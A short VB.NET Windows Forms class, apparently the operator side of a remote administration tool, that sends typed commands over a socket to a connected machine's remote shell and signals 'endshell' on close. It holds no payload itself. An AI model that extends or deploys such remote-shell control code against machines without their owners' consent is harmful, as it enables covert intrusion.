Public Class Shell
    Public sock As Integer

    Private Sub CommandTextBox_KeyPress(sender As Object, e As KeyPressEventArgs) Handles CommandTextBox.KeyPress
        If e.KeyChar = Microsoft.VisualBasic.ChrW(System.Windows.Forms.Keys.Return) Then
            Main.S.Send(sock, Main.n.putshell & Main.Sep & CommandTextBox.Text)
            CommandTextBox.Text = ""
        End If
    End Sub

    Private Sub Shell_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Main.S.Send(sock, Main.n.endshell)
    End Sub
End Class